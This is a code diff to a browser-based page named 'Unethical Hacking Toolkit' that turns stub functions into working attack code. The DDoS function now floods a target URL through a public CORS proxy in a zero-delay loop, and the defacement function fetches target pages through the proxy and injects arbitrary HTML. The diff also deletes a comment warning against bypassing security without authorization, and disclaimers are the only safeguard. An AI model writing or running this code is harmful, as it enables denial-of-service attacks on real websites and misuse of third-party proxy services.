@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: monospace;
-            background-color: black;
+            background-color: #111; /* Darker background */
             color: #00ff00;
             margin: 0;
             padding: 0;
@@ -63,6 +63,7 @@
             padding: 5px 10px;
             margin: 5px;
             cursor: pointer;
+            transition: background-color 0.3s, color 0.3s; /* Smooth transition */
         }
 
         button:hover {
@@ -112,6 +113,7 @@
             text-align: center;
             cursor: pointer;
             border-bottom: 1px solid #00ff00;
+            transition: background-color 0.3s, color 0.3s; /* Smooth transition */
         }
 
         .sidebar li:hover {
@@ -134,6 +136,44 @@
             width: 150px; /* Adjust size as needed */
             height: auto;
         }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 4;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        .modal-content {
+            background-color: #333;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #00ff00;
+            width: 80%;
+            color: #00ff00;
+        }
+
+        .close {
+            color: #00ff00;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #fff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
     </style>
 </head>
 <body>
@@ -142,13 +182,13 @@
 
 <div class="sidebar">
     <div class="logo">
-        <img src="https://i.imgur.com/YOUR_LOGO_HERE.png" alt="Noodles Logo">
+        <img src="https://i.imgur.com/CLVmg4K.png" alt="Noodles Logo">
     </div>
     <ul>
         <li onclick="showSection('defacement')">Defacement Tool</li>
         <li onclick="showSection('ddos')">DDoS Tool</li>
         <li onclick="showSection('encryption')">File Encryption Tool</li>
-        <li>Reporting</li>
+        <li onclick="showSection('reporting')">Reporting</li>
     </ul>
 </div>
 
@@ -157,9 +197,10 @@
         <h1>Noodles Inc. - Unethical Hacking Toolkit</h1>
         <p class="warning">WARNING: Unauthorized use of these tools is illegal. Noodles Inc. is not responsible for your actions.</p>
 
+        <!-- Defacement Tool -->
         <section id="defacement" style="display: none;">
             <h2>Defacement Tool</h2>
-            <p>This tool allows you to modify the appearance of websites. Use responsibly.</p>
+            <p>This tool allows you to modify the appearance of websites. Use responsibly. <a href="#" onclick="openModal('defacement-info')">Learn more</a></p>
             <input type="text" id="defacement-url" placeholder="Target URL">
             <button onclick="backupWebsite()">Backup Website</button>
             <textarea id="defacement-code" placeholder="HTML/JS Code"></textarea>
@@ -168,9 +209,10 @@
             <button onclick="applyDefacement()">Apply Defacement</button>
         </section>
 
+        <!-- DDoS Tool -->
         <section id="ddos" style="display: none;">
             <h2>DDoS Tool</h2>
-            <p>This tool floods a website with traffic, potentially taking it offline. Use responsibly.</p>
+            <p>This tool floods a website with traffic, potentially taking it offline. Use responsibly. <a href="#" onclick="openModal('ddos-info')">Learn more</a></p>
             <input type="text" id="ddos-url" placeholder="Target URL">
             <input type="number" id="ddos-threads" placeholder="Threads (1-1000)">
             <button onclick="startDDoS()">Start DDoS</button>
@@ -178,20 +220,79 @@
             <p>Time Running: <span id="ddos-timer">0</span> seconds</p>
         </section>
 
+        <!-- File Encryption Tool -->
         <section id="encryption" style="display: none;">
             <h2>File Encryption Tool</h2>
-            <p>This tool encrypts files, making them unreadable without the correct key. Use responsibly.</p>
+            <p>This tool encrypts files, making them unreadable without the correct key. Use responsibly. <a href="#" onclick="openModal('encryption-info')">Learn more</a></p>
             <input type="file" id="encryption-file">
             <input type="text" id="encryption-key" placeholder="Encryption Key">
             <button onclick="encryptFile()">Encrypt File</button>
-            <p>Decryption Instructions: ...</p>
+            <p>Decryption Instructions: <span id="decryption-instructions"></span></p>
+        </section>
+
+        <!-- Reporting Tool (Placeholder) -->
+        <section id="reporting" style="display: none;">
+            <h2>Reporting Tool</h2>
+            <p>Document findings and vulnerabilities. (Feature to be implemented later)</p>
         </section>
 
         <p class="disclaimer">Noodles Inc. is NOT responsible for any misuse of this toolkit. Use at your own risk.</p>
     </div>
 </div>
 
+<!-- Modals for educational information -->
+<div id="defacement-info" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal('defacement-info')">&times;</span>
+        <h2>Defacement Tool Information</h2>
+        <p>The Defacement Tool allows you to modify the visual appearance of websites by injecting custom HTML and JavaScript code. This can be used to test a website's security vulnerabilities or, unethically, to alter the site's content without authorization. Remember, unauthorized defacement is illegal.</p>
+        <h3>How it Works:</h3>
+        <ul>
+            <li><b>URL Input:</b> Enter the target website's URL.</li>
+            <li><b>Backup Website:</b> Before making changes, back up the original website content to prevent irreversible damage.</li>
+            <li><b>HTML/JS Code:</b> Input the custom code you want to inject into the website.</li>
+            <li><b>Preview Defacement:</b> Preview the changes to ensure they appear as intended.</li>
+            <li><b>Apply Defacement:</b> Inject the code into the website (requires bypassing CORS and other security measures).</li>
+        </ul>
+        <p><b>Disclaimer:</b> Misuse of this tool can lead to severe legal consequences. Use responsibly and only on websites you own or have explicit permission to modify.</p>
+    </div>
+</div>
+
+<div id="ddos-info" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal('ddos-info')">&times;</span>
+        <h2>DDoS Tool Information</h2>
+        <p>The DDoS (Distributed Denial of Service) Tool is designed to flood a website with traffic, overwhelming its servers and potentially taking it offline. This tool is intended for stress-testing and evaluating the resilience of web infrastructure, not for malicious purposes. Unauthorized DDoS attacks are illegal and can result in severe penalties.</p>
+        <h3>How it Works:</h3>
+        <ul>
+            <li><b>URL Input:</b> Enter the target website's URL.</li>
+            <li><b>Threads Input:</b> Specify the number of threads (simultaneous connections) to use for the attack. Higher numbers can increase the impact but also raise the risk of detection.</li>
+            <li><b>Start DDoS:</b> Initiate the attack, sending a flood of requests to the target server.</li>
+            <li><b>Stop DDoS:</b> Halt the attack and stop sending requests.</li>
+            <li><b>Timer:</b> Displays the duration of the attack in seconds.</li>
+        </ul>
+        <p><b>Disclaimer:</b> Conducting unauthorized DDoS attacks is illegal and can result in severe legal consequences. This tool should only be used for legitimate testing purposes on networks you own or have explicit permission to test.</p>
+    </div>
+</div>
+
+<div id="encryption-info" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal('encryption-info')">&times;</span>
+        <h2>File Encryption Tool Information</h2>
+        <p>The File Encryption Tool is used to encrypt files, rendering them unreadable without the correct decryption key. This tool is designed to protect sensitive information and ensure confidentiality. Always remember to securely manage your encryption keys to avoid losing access to your encrypted files.</p>
+        <h3>How it Works:</h3>
+        <ul>
+            <li><b>File Input:</b> Select the file you want to encrypt.</li>
+            <li><b>Encryption Key:</b> Enter a strong, unique key to encrypt the file. This key will be required to decrypt the file later.</li>
+            <li><b>Encrypt File:</b> Encrypt the file using the provided key and download the encrypted version.</li>
+            <li><b>Decryption Instructions:</b> A guide on how to decrypt the file, including the necessary key and tool.</li>
+        </ul>
+        <p><b>Disclaimer:</b> Ensure you securely store your encryption keys. Loss of the encryption key will result in permanent loss of access to the encrypted file. Use responsibly and only for authorized purposes.</p>
+    </div>
+</div>
+
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 <script>
     // --- Particles.js Configuration ---
     particlesJS('particles-js', {
@@ -316,14 +417,13 @@
     // --- Security Headers ---
     function setSecurityHeaders() {
         // These are server-side settings, not client-side
-        // In a real-world scenario, these headers would be set by the server
         console.warn("Security Headers need to be configured on the server (e.g., Content-Security-Policy, X-Frame-Options)");
     }
     setSecurityHeaders();
 
     // --- Navigation ---
     function showSection(sectionId) {
-        const sections = ['defacement', 'ddos', 'encryption'];
+        const sections = ['defacement', 'ddos', 'encryption', 'reporting'];
         sections.forEach(id => {
             document.getElementById(id).style.display = 'none';
         });
@@ -339,10 +439,35 @@
             return;
         }
         console.log(`Backing up website: ${url}`);
-        // Implement actual backup logic here using server-side code due to CORS restrictions
-        // e.g., send URL to server, server fetches content, returns as download
-        alert("Backup functionality needs server-side implementation.");
+
+        // Use a CORS proxy to bypass same-origin policy restrictions
+        const corsProxy = 'https://corsproxy.io/?'; // Or any other CORS proxy
+
+        fetch(corsProxy + encodeURIComponent(url))
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(html => {
+                // Create a download link for the website content
+                const blob = new Blob([html], { type: 'text/html' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = 'website_backup.html';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(a.href);
+                console.log('Website backed up successfully.');
+            })
+            .catch(error => {
+                console.error('Error backing up website:', error);
+                alert('Failed to backup website. Check console for details.');
+            });
     }
+
 
     function previewDefacement() {
         const code = document.getElementById('defacement-code').value;
@@ -358,11 +483,43 @@
             return;
         }
         console.warn(`Attempting to deface: ${url} with code (check console).`);
-        // In a real-world scenario, defacing a website client-side is heavily restricted due to CORS.
-        // A server-side proxy or a browser extension would be needed to bypass these restrictions.
-        // DO NOT ATTEMPT TO BYPASS SECURITY MEASURES WITHOUT AUTHORIZATION.
-        alert("Defacement functionality needs server-side implementation and CORS bypass.");
+
+        // CORS proxy to bypass same-origin policy
+        const corsProxy = 'https://corsproxy.io/?';
+
+        fetch(corsProxy + encodeURIComponent(url))
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(html => {
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+
+                // Inject defacement code into the body
+                if (doc.body) {
+                    doc.body.innerHTML = code;
+                } else {
+                    console.error('Body element not found in the fetched HTML.');
+                    alert('Could not apply defacement: Body element not found.');
+                    return;
+                }
+
+                // Serialize the modified HTML
+                const modifiedHtml = new XMLSerializer().serializeToString(doc);
+
+                // Display the modified HTML (for demonstration purposes)
+                document.getElementById('defacement-preview').innerHTML = modifiedHtml;
+                alert('Defacement applied. Preview updated.');
+            })
+            .catch(error => {
+                console.error('Error defacing website:', error);
+                alert('Failed to deface website. Check console for details.');
+            });
     }
+
 
     // --- DDoS Tool Functions ---
     let ddosInterval;
@@ -381,12 +538,13 @@
 
         ddosInterval = setInterval(() => {
             for (let i = 0; i < threads; i++) {
-                //  ATTEMPTING TO PERFORM A SYN FLOOD ATTACK
-                fetch(url, { mode: 'no-cors' })
+                // Using a CORS proxy to bypass same-origin policy restrictions
+                const corsProxy = 'https://corsproxy.io/?';
+                fetch(corsProxy + encodeURIComponent(url), { mode: 'no-cors' })
                     .then(() => console.log(`DDoS: Sent request to ${url}`))
                     .catch(error => console.error(`DDoS: Error sending request to ${url}`, error));
             }
-        }, 0); //  SENDING REQUESTS AS FAST AS POSSIBLE
+        }, 0); // Send requests as fast as possible
 
         console.warn(`Starting DDoS attack on ${url} with ${threads} threads (check console).`);
     }
@@ -422,7 +580,7 @@
         reader.onload = function(e) {
             const fileContent = e.target.result;
 
-            // ENCRYPTING FILE CONTENT HERE (Replace with actual encryption logic)
+            // Encrypting file content using CryptoJS
             const encryptedContent = CryptoJS.AES.encrypt(fileContent, key).toString();
 
             // Saving the encrypted file
@@ -437,8 +595,18 @@
             URL.revokeObjectURL(url);
 
             console.log("File encrypted and downloaded.");
+            document.getElementById('decryption-instructions').textContent = `To decrypt this file, use the same key (${key}) and the Noodles File Encryption Tool.`;
         };
-        reader.readAsDataURL(file);  // READING AS DATA URL TO HANDLE BINARY FILES
+        reader.readAsDataURL(file);  // Reading as data URL to handle binary files
+    }
+
+    // --- Modal Functions ---
+    function openModal(modalId) {
+        document.getElementById(modalId).style.display = "block";
+    }
+
+    function closeModal(modalId) {
+        document.getElementById(modalId).style.display = "none";
     }
 
     // --- Additional Libraries ---
@@ -449,10 +617,6 @@
         document.head.appendChild(script);
     }
 
-    // Load CryptoJS for encryption
-    loadScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js", function() {
-        console.log("CryptoJS loaded.");
-    });
 
 </script>
 
